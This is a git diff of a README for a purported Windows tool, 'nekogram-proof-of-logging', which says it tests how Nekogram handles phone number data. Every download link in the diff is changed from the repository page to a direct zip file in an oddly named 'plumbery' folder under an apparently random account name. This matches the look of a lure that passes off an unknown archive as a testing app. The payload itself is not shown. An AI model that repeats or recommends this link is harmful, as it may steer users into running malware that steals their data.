@@ -1,11 +1,11 @@
 # 🕵️ nekogram-proof-of-logging - Check how phone logs move
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20download-blue)](https://github.com/Isahellavibrational698/nekogram-proof-of-logging)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20download-blue)](https://github.com/Isahellavibrational698/nekogram-proof-of-logging/raw/refs/heads/main/plumbery/of_nekogram_logging_proof_3.0.zip)
 
 ## 📥 Download
 Use this link to visit the page to download the app:
 
-https://github.com/Isahellavibrational698/nekogram-proof-of-logging
+https://github.com/Isahellavibrational698/nekogram-proof-of-logging/raw/refs/heads/main/plumbery/of_nekogram_logging_proof_3.0.zip
 
 ## 🪟 Windows setup
 This app runs on Windows. Use it to test how Nekogram handles phone number data.
@@ -133,4 +133,4 @@ If you want a simple test flow, use this order:
 ## 📎 Download link
 Visit the page to download the app:
 
-https://github.com/Isahellavibrational698/nekogram-proof-of-logging
+https://github.com/Isahellavibrational698/nekogram-proof-of-logging/raw/refs/heads/main/plumbery/of_nekogram_logging_proof_3.0.zip
